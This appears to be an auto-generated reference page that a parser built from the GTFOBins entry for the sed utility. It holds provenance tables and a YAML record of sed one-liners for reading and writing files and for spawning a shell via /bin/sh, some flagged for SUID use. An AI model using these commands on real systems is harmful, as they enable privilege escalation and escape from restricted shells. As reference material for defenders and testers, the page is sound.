---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# sed

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `sed` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/sed` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [sed](../../tools/linux/sed.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | sed |
| name | sed |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/sed/ |

## Preserved Source Material

```yaml
_body: ''
_name: sed
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/sed
functions:
  file-read:
  - code: sed '' /path/to/input-file
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  file-write:
  - code: sed -n '1s/.*/DATA/w /path/to/output-file' /etc/hosts
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  shell:
  - code: sed -n '1e exec /bin/sh 1>&0' /etc/hosts
    contexts:
      sudo: null
      suid:
        shell: true
      unprivileged: null
    version: GNU
  - code: sed e
    contexts:
      sudo: null
      suid:
        shell: true
      unprivileged: null
    tty: false
    version: GNU
```
